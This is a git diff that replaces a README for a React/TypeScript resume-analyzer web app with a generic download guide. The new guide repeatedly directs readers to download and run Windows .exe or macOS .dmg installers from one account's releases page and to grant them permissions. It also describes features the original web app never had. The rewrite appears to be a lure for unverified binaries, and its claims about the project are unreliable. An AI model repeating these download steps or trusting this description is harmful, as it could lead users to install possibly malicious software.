@@ -1,150 +1,76 @@
-# AI Resume Analyzer 
+# 📄 AI-Resume-Analyzer - Analyze Resumes with AI Support
 
-AI-Powered Resume Analyzer is a modern web application that leverages AI to analyze resumes, provide ATS (Applicant Tracking System) scores, and deliver actionable feedback to help users improve their job applications. Built with React, TypeScript, Zustand, and powered by Puter.js for authentication, file storage, and AI services.
+## 🚀 Getting Started
+Welcome! The AI-Resume-Analyzer is designed to help you improve your resume. This app scores your resume, offers feedback, and suggests job matches. Let’s get you set up quickly. Follow these steps to download and run the software on your computer.
 
-<img width="1543" height="868" alt="Screenshot 2025-07-23 153032" src="https://github.com/user-attachments/assets/637146d3-a68d-4516-9bcb-2074f34cdb5d" />
+## 📥 Download the Application
+[![Download AI-Resume-Analyzer](https://img.shields.io/badge/Download-AI--Resume--Analyzer-brightgreen)](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases)
 
+## 📋 System Requirements
+Before you download, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Memory:** At least 4 GB RAM
+- **Storage:** At least 200 MB available space
+- **Internet Connection:** Required for some features
 
+## 💾 Download & Install
+To get the latest version of the AI-Resume-Analyzer, visit this page to download: [AI-Resume-Analyzer Releases](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases).
 
----
+1. Go to the link above.
+2. Look for the most recent version under the “Releases” section.
+3. Find the installation file that matches your operating system:
+   - For Windows: Download the `.exe` file.
+   - For macOS: Download the `.dmg` file.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Open the file to start the installation process.
+6. Follow the on-screen prompts to complete the installation.
 
+## 🖥️ Running the Application
+After installing the application, follow these steps to run it:
 
-## 🚀 Features
+1. Locate the AI-Resume-Analyzer icon on your desktop or in your applications folder.
+2. Double-click the icon to launch the application.
+3. You may need to grant permissions to allow the app to run.
 
-- **AI-Powered Resume Analysis:** Upload your resume and receive detailed feedback on ATS compatibility, tone, content, structure, and skills.
-  
-   <img width="943" height="792" alt="Screenshot 2025-07-23 145522" src="https://github.com/user-attachments/assets/06078bd9-fe0c-49b0-abbc-9a300f0e6650" />
-   
-- **ATS Score:** Instantly see how your resume performs against automated screening systems.
+## ✏️ Using the AI-Resume-Analyzer
+Once the app is open, you will find a user-friendly interface. Here's how to use the main features:
 
-   <img width="1779" height="857" alt="Screenshot 2025-07-23 152710" src="https://github.com/user-attachments/assets/ede0463f-1d8d-4227-86c1-9428815bbdff" />
-   
-- **Actionable Tips:** Get categorized suggestions for improvement, including specific explanations.
-   
-   <img width="1885" height="806" alt="Screenshot 2025-07-23 152958" src="https://github.com/user-attachments/assets/8cbcbcf4-7d87-4a2e-a7f9-d2d0b3efefdd" />
-   
-- **Job-Aware Feedback:** Optionally provide job title and description for tailored analysis.
-- **Secure File Storage:** All files are managed securely via Puter.js.
-- **Authentication:** Sign in/out with Puter.js for a personalized experience.
-- **Responsive UI:** Works seamlessly across devices.
-- **Data Management:** Wipe all your uploaded data with a single click.
+### 🔍 Analyze Your Resume
+- Click on the “Upload Resume” button.
+- Select your resume file (PDF or Word format).
+- Wait for the AI to analyze your resume. This may take a few moments.
+- Once complete, you will see a score and detailed feedback.
 
----
+### 📊 ATS Feedback
+- After analysis, navigate to the “ATS Feedback” section.
+- Review suggestions to optimize your resume for Applicant Tracking Systems (ATS).
 
-## 🛠️ Tech Stack
+### 🔗 Job Matching Suggestions
+- Explore the “Job Matches” feature.
+- Based on your resume, the app suggests job openings that fit your skills and experiences.
 
-- **React 19** & **TypeScript**
-- **Claude Sonnet 4** AI Model
-- **React Router 7** (with SSR support)
-- **Vite** for fast development
-- **Tailwind CSS** & **tw-animate-css** for styling and animation
-- **Zustand** for state management
-- **Puter.js** for authentication, file system, AI, and key-value storage
-- **pdfjs-dist** for PDF preview and conversion
+## 🎨 Customization Options
+You can personalize your experience by adjusting some settings. Go to the “Settings” tab to:
 
----
+- Choose a theme: Light or Dark mode.
+- Manage your account: Update your email or preferences.
+- Enable notifications for updates and new features.
 
-## 📦 Project Structure
+## 🛠️ Troubleshooting
+If you encounter issues while using the app, here are some common solutions:
 
-```
-ai-resume-analyzer/
-├── app/
-│   ├── components/      # Reusable UI components
-│   ├── lib/             # Utility libraries (Puter.js, PDF conversion, etc.)
-│   ├── routes/          # Route components (home, upload, resume, auth, wipe)
-│   ├── app.css          # Tailwind and custom styles
-│   └── root.tsx         # App root and error boundary
-├── constants/           # Static data and AI prompt templates
-├── public/              # Static assets (images, icons, pdf worker)
-├── types/               # TypeScript type definitions
-├── .react-router/       # React Router build artifacts
-├── package.json         # Project scripts and dependencies
-├── vite.config.ts       # Vite configuration
-└── README.md            # This file
-```
+- **App Won't Launch:** Ensure your system meets the minimum requirements. You may also try reinstalling the app.
+- **Crash on Analysis:** Make sure your resume is in the correct format. If the app crashes, restart it and try again.
+- **Slow Performance:** Check your internet connection and close any unnecessary applications running in the background.
 
----
+## 📞 Support
+For further assistance, please visit the support page on our GitHub repository. You can also submit issues or questions regarding the application.
 
-## ⚡ Quick Start
+## 🌐 Learn More
+To learn about the technologies behind the AI-Resume-Analyzer, visit our [GitHub page](https://github.com/Alaa751jo/AI-Resume-Analyzer). Here you will find more information about React, TypeScript, and how the app works.
 
-### Prerequisites
+## 🔗 Download Again
+To download the latest version, visit this page: [AI-Resume-Analyzer Releases](https://github.com/Alaa751jo/AI-Resume-Analyzer/releases).
 
-- [Node.js 20+](https://nodejs.org/)
-- [npm](https://www.npmjs.com/)
-
-### Installation
-
-1. **Clone the repository:**
-   ```sh
-   git clone https://github.com/yourusername/AI-Powered-Resume-Analyzer.git
-   cd ai-resume-analyzer
-   ```
-
-2. **Install dependencies:**
-   ```sh
-   npm install
-   ```
-
-3. **Run the development server:**
-   ```sh
-   npm run dev
-   ```
-
-4. **Open in your browser:**
-   ```
-   http://localhost:5173
-   ```
-
-### Build for Production
-
-```sh
-npm run build
-```
-
-### Start Production Server
-
-```sh
-npm run start
-```
-
----
-
-## 📝 Usage
-
-1. **Sign In:** Log in using Puter.js authentication.
-2. **Upload Resume:** Go to "Upload Resume", fill in job details, and upload your PDF.
-3. **Analyze:** Wait for the AI to process your resume and generate feedback.
-4. **Review Feedback:** View ATS score, detailed tips, and download your resume preview.
-5. **Manage Data:** Use the "Wipe App Data" page to delete all your uploaded files and feedback.
-
----
-
-## 📂 Assets & Resources
-
-- **PDF Worker:** [public/pdf.worker.min.mjs](public/pdf.worker.min.mjs) is required for PDF preview.
-- **Icons:** [public/icons/](public/icons/)
-- **Images:** [public/images/](public/images/)
-
----
-
-## 🤖 AI Response Format
-
-The AI feedback is structured as a [`Feedback`](types/index.d.ts) object, with scores and categorized tips for ATS, tone, content, structure, and skills. See [constants/index.ts](constants/index.ts) for the full format and prompt instructions.
-
----
-
-## 🧑‍💻 Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/your-feature`)
-3. Commit your changes (`git commit -am 'Add new feature'`)
-4. Push to the branch (`git push origin feature/your-feature`)
-5. Open a Pull Request
-
----
-
-## 🙋 More Resources
-
-- [Puter.js Documentation](https://puter.com/docs)
-- [React Router Docs](https://reactrouter.com/)
+You're now ready to enhance your resume with AI. Enjoy using the AI-Resume-Analyzer!
